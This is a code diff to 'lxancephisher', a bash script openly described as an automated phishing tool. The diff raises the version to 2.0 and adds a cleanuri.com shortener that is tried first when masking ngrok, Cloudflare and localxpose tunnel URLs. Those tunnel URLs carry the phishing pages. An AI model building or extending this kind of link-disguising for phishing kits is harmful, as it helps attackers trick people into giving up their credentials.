@@ -2,7 +2,7 @@
 
 ##   lxancephisher 	: 	Automated Phishing Tool
 ##   Author 		: 	Prince Katiyar
-##   Version 		: 	1.5
+##   Version 		: 	2.0
 ##   Github 		: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
@@ -79,7 +79,7 @@
 ##      Copyright (C) 2022 LXANCE-HACKER (https://github.com/LxaNce-Hacker)
 ##
 
-__version__="1.5"
+__version__="2.0"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
@@ -612,15 +612,24 @@ shorteny() {
 	fi
 }
 
+## cleanuri for cleanuri
+Cleanuri() {
+	short=$(curl -s -X POST -d "url=$2" "$1" | jq -r '.result_url')
+	processed_url=${short#http*//}
+}
+
 custom_url() {
 	url=${1#http*//}
+	cleanuri="https://cleanuri.com/api/v1/shorten"
 	isgd="https://www.is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
+		if [[ $(curl -i -s -X POST -d "url=https://example.com" https://cleanuri.com/api/v1/shorten | grep -i 'HTTP/' | awk '{print $2}') == 2* ]]; then
+			Cleanuri $cleanuri "https://$url"
+		elif [[ $(site_stat $isgd) == 2* ]]; then
 			shorteny $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
 			shorten $shortcode "$url"
